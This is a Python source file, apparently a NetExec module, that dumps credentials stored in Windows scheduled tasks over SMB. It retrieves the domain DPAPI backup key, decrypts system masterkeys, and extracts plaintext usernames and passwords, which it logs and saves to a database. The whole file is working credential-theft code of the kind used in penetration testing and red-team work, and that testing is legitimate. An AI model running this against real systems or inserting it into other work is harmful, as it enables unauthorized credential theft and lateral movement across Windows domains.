from dploot.triage.credentials import CredentialsTriage
from dploot.lib.target import Target

from nxc.helpers.logger import highlight
from nxc.protocols.smb.dpapi import (
    collect_masterkeys_from_target,
    get_domain_backup_key,
    upgrade_to_dploot_connection,
)


class NXCModule:
    """Dump credentials stored in scheduled tasks"""

    name = "schtask_creds"
    description = "Dump credentials from Scheduled Tasks via DPAPI"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """Module does not accept options"""

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        self.pvkbytes = get_domain_backup_key(connection)

        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else f"{connection.hostname}.{connection.domain}",
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )

        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return

        masterkeys = collect_masterkeys_from_target(connection, target, conn, user=False, system=True)

        if len(masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(
            f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting scheduled task credentials"
        )

        def credential_callback(credential):
            line = f"[{credential.winuser}] {credential.target} - {credential.username}:{credential.password}"
            context.log.highlight(line)
            context.db.add_dpapi_secrets(
                target.address,
                "SCHEDULED_TASK",
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )

        try:
            triage = CredentialsTriage(
                target=target,
                conn=conn,
                masterkeys=masterkeys,
                per_credential_callback=credential_callback,
            )
            triage.triage_system_credentials()
        except Exception as e:
            context.log.debug(f"Could not loot scheduled task credentials: {e}")
